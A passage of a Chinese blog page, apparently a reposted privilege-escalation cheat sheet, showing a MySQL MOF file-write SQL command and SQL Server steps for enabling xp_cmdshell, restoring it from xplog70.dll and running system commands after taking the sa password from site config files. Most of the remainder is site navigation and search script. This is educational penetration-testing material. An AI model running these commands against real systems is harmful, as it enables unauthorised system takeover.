+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/xxx.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Sqlserver篇"><a href="#Sqlserver篇" class="headerlink" title="Sqlserver篇"></a>Sqlserver篇</h2><hr>
+<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><h4 id="提权前提-1"><a href="#提权前提-1" class="headerlink" title="提权前提"></a>提权前提</h4><ul>
+<li><p>获取sa账号密码，例如查看网站的配置文件conn.asp,config.asp等。</p>
+</li>
+<li><p>需要开启xp_cmdshell才可执行系统命令  </p>
+</li>
+</ul>
+<h4 id="提权过程-2"><a href="#提权过程-2" class="headerlink" title="提权过程"></a>提权过程</h4><ul>
+<li><p>开启xp_cmdshell组件  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/articles/权限提升姿势/20200411165707-6c32c566-7bd2-1.png" alt></p>
+</li>
+<li><p>如果xp_cmdshell组件被删除，上传xplog70.dll  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>执行命令  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell 'cmd'</span><br></pre></td></tr></table></figure>
+
+<p><img src="/articles/权限提升姿势/20200411165728-78b45ed0-7bd2-1.png" alt></p>
+</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><hr>
+<p>这篇文章记录的提权方法都是较新或者比较经典，对实战有帮助的提权方法，其实还有很多其他的提权方法，碍于没有成功复现不好对提权的难度和利用条件做出判断，后续有机会也会慢慢都收录下。</p>
+
+          
+             <div class="reprint">
+                <blockquote>
+                   <p>原文：<a href="https://xz.aliyun.com/t/7573?accounttraceid=efd07d14e3c8448a89a6d40857d5c261oxgd" target="_blank" rel="noopener">权限提升备忘录</a></p>
+                </blockquote>
+              </div>
+          
+        
+        
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+  <img id="wechat_subscriber_qcode" src="/mp.png" style="width: 200px; max-width: 100%;">
+  <div>关注作者公众号,获取更多资源!</div>
+</div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div id="reward-container">
+  <div>赏作者一杯咖啡~</div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    赏
+  </button>
+  <div id="qr" style="display: none;">
+
+    
+      
+      
+        
+      
+      <div style="display: inline-block">
+        <img src="/wxpay.png" alt="Mr.Gou 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+      
+      
+        
+      
+      <div style="display: inline-block">
+        <img src="/alipay.png" alt="Mr.Gou 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Mr.Gou</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://ya2.top/articles/权限提升姿势/" title="权限提升姿势">https://ya2.top/articles/权限提升姿势/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！</li>
+</ul>
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
+          
+            <a href="/tags/提权/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+          
+            <a href="/tags/udf-dll/" rel="tag"><i class="fa fa-tag"></i> udf.dll</a>
+          
+            <a href="/tags/sqlserver/" rel="tag"><i class="fa fa-tag"></i> sqlserver</a>
+          
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+          
+            <a href="/tags/nullevt-mof/" rel="tag"><i class="fa fa-tag"></i> nullevt.mof</a>
+          
+            <a href="/tags/mof/" rel="tag"><i class="fa fa-tag"></i> mof</a>
+          
+            <a href="/tags/suid/" rel="tag"><i class="fa fa-tag"></i> suid</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/articles/电商设计手册/" rel="prev" title="电商设计手册">
+                <i class="fa fa-chevron-left"></i> 电商设计手册
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/articles/分布式哈希表-DHT-和P2P技术/" rel="next" title="分布式哈希表 (DHT) 和 P2P 技术">
+                分布式哈希表 (DHT) 和 P2P 技术 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://img.sqydt.darongshutech.com/image_201907090032257276.jpg" alt="Mr.Gou">
+            
+              <p class="site-author-name" itemprop="name">Mr.Gou</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">153</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/gouyuwang" title="GitHub &rarr; https://github.com/gouyuwang" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:529156563@gmail.com" title="E-Mail &rarr; mailto:529156563@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/u/3820911628" title="Weibo &rarr; https://weibo.com/u/3820911628" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ruanyifeng.com/blog/" title="http://www.ruanyifeng.com/blog/" rel="noopener" target="_blank">阮一峰的网络日志</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">离别歌 - 代码审计漏洞挖掘pythonc++</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://92ez.com/" title="http://92ez.com/" rel="noopener" target="_blank">一只猿 - 前端攻城尸</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.yulegeyu.com/" title="http://www.yulegeyu.com/" rel="noopener" target="_blank">雨了个雨&#39;s blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://thief.one/" title="https://thief.one/" rel="noopener" target="_blank">nMask&#39;s Blog - 风陵渡口</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wiki.learnblockchain.cn/bitcoin/readme.html" title="https://wiki.learnblockchain.cn/bitcoin/readme.html" rel="noopener" target="_blank">区块链技术导航</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+              
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows篇"><span class="nav-number">2.</span> <span class="nav-text">windows篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows溢出提权"><span class="nav-number">2.1.</span> <span class="nav-text">windows溢出提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#具体步骤"><span class="nav-number">2.1.1.</span> <span class="nav-text">具体步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动项提权"><span class="nav-number">2.2.</span> <span class="nav-text">启动项提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#具体步骤-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">具体步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAC提权（CVE-2019-1388）"><span class="nav-number">2.3.</span> <span class="nav-text">UAC提权（CVE-2019-1388）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞简介"><span class="nav-number">2.3.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围"><span class="nav-number">2.3.2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现准备"><span class="nav-number">2.3.3.</span> <span class="nav-text">复现准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现过程"><span class="nav-number">2.3.4.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Juicypotato"><span class="nav-number">2.4.</span> <span class="nav-text">Juicypotato</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#工具简介"><span class="nav-number">2.4.1.</span> <span class="nav-text">工具简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现准备-1"><span class="nav-number">2.4.2.</span> <span class="nav-text">复现准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现过程-1"><span class="nav-number">2.4.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux篇"><span class="nav-number">3.</span> <span class="nav-text">linux篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内核溢出"><span class="nav-number">3.1.</span> <span class="nav-text">内核溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#具体步骤-2"><span class="nav-number">3.1.1.</span> <span class="nav-text">具体步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定时任务提权"><span class="nav-number">3.2.</span> <span class="nav-text">定时任务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是定时任务"><span class="nav-number">3.2.1.</span> <span class="nav-text">什么是定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权前提"><span class="nav-number">3.2.2.</span> <span class="nav-text">提权前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现准备-2"><span class="nav-number">3.2.3.</span> <span class="nav-text">复现准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现过程-2"><span class="nav-number">3.2.4.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suid提权"><span class="nav-number">3.3.</span> <span class="nav-text">suid提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是suid提权"><span class="nav-number">3.3.1.</span> <span class="nav-text">什么是suid提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权过程"><span class="nav-number">3.3.2.</span> <span class="nav-text">提权过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo权限绕过（CVE-2019-14287）"><span class="nav-number">3.4.</span> <span class="nav-text">sudo权限绕过（CVE-2019-14287）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞简介-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-1"><span class="nav-number">3.4.2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现准备-3"><span class="nav-number">3.4.3.</span> <span class="nav-text">复现准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现过程-3"><span class="nav-number">3.4.4.</span> <span class="nav-text">复现过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql篇"><span class="nav-number">4.</span> <span class="nav-text">Mysql篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF提权"><span class="nav-number">4.1.</span> <span class="nav-text">UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是UDF"><span class="nav-number">4.1.1.</span> <span class="nav-text">什么是UDF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权过程-1"><span class="nav-number">4.1.2.</span> <span class="nav-text">提权过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MOF"><span class="nav-number">4.2.</span> <span class="nav-text">MOF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是MOF提权"><span class="nav-number">4.2.1.</span> <span class="nav-text">什么是MOF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MOF代码"><span class="nav-number">4.2.2.</span> <span class="nav-text">MOF代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用法"><span class="nav-number">4.2.3.</span> <span class="nav-text">用法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sqlserver篇"><span class="nav-number">5.</span> <span class="nav-text">Sqlserver篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xp-cmdshell"><span class="nav-number">5.1.</span> <span class="nav-text">xp_cmdshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提权前提-1"><span class="nav-number">5.1.1.</span> <span class="nav-text">提权前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权过程-2"><span class="nav-number">5.1.2.</span> <span class="nav-text">提权过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright"> &copy; 
+  <span itemprop="copyrightYear">2022</span>  
+
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"><a href="https://beian.miit.gov.cn" target="_blank">蜀ICP备2022014529号</a> </span> 
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+      
+        <div class="footer-inner">
+    <span onclick="showSoul();" id="footer-soul" style="cursor:pointer;padding-left:10px;" title="点击再来一碗"></span><i class="fa fa-stop-circle" id="speak" onclick="speakSwitch(this)"></i>
+</div>
+
+<script type="text/javascript">
+
+var interval;
+var __SPEAK__='__SPEAK__';
+
+function speakSwitch(e){
+    var nowState = e.className
+    var flag = 0;
+    if(-1 != nowState.indexOf('fa-play-circle')){
+         flag = 0;
+         e.className = nowState.replace('fa-play-circle','fa-stop-circle')
+    }else{
+         flag = 1;
+         e.className = nowState.replace('fa-stop-circle','fa-play-circle')
+    } 
+    localStorage.setItem(__SPEAK__,flag); 
+}
+
+function speak(content) {
+    // 详情见 https://developer.mozilla.org/en-US/docs/Web/API/SpeechSynthesis 
+    let synth = window.speechSynthesis;
+    let voices = synth.getVoices().filter (voice => voice.lang.startsWith("zh-CN"));
+    if (voices.length == 0) return;
+    let utterThis = new SpeechSynthesisUtterance(content);
+    utterThis.voice = voices[0];
+    synth.speak(utterThis);
+}
+
+function showSoul(){
+    var soul =localStorage.getItem('soul');
+    if(!soul){  
+        let xhr = (new XMLHttpRequest()) ||  (new ActiveXObject("Microsoft.XMLHttp"));
+        xhr.open("get", location.protocol+'//'+location.host+'/soul.json');
+        xhr.send(null); 
+        xhr.onload = function () {  
+            if (xhr.status == 200) { 
+                soul =  xhr.responseText;
+                localStorage.setItem('soul',soul);
+            }
+        }
+    } 
+    if(soul){ 
+        soul = JSON.parse(soul); 
+        if(interval){
+            clearInterval(interval) 
+        } 
+        content = soul[parseInt(Math.random()*(soul.length+1),10)];
+        document.getElementById('footer-soul').innerHTML = content;
+        (1 == localStorage.getItem(__SPEAK__)) && speak(content);
+        interval = setInterval(showSoul,10*1000); 
+    }
+} 
+
+setTimeout(showSoul,0); 
+
+</script>
+      
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.2.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+
+  
+  <script src="/js/js.cookie.js?v=7.2.0"></script>
+  <script src="/js/scroll-cookie.js?v=7.2.0"></script>
+
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
